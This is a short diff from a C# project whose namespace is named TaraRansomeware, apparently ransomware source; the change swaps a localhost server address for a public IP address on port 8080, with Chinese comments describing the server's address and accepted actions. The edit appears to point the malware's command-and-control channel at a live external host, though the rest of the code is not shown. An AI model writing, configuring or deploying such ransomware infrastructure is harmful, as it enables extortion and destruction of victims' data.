@@ -11,7 +11,7 @@ namespace TaraRansomeware.Utilities
         /// <summary>
         /// 声明HTTP服务器的协议、IP地址、端口
         /// </summary>
-        private static readonly string baseUrl = "http://localhost:8080/";
+        private static readonly string baseUrl = "http://47.94.198.61:8080/";
 
         /// <summary>
         /// 服务器接受的动作类型
